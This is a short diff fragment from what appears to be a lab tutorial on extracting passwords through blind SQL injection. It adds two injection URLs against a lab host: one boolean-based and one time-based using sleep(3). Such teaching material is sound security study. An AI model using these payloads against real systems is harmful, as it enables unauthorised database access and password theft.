@@ -37,3 +37,15 @@ We can systematically extract passwords as follows:
 
 
 We continue with this until we extract the entire password.
+
+
+
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+```
+
+```
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+```
+
+\
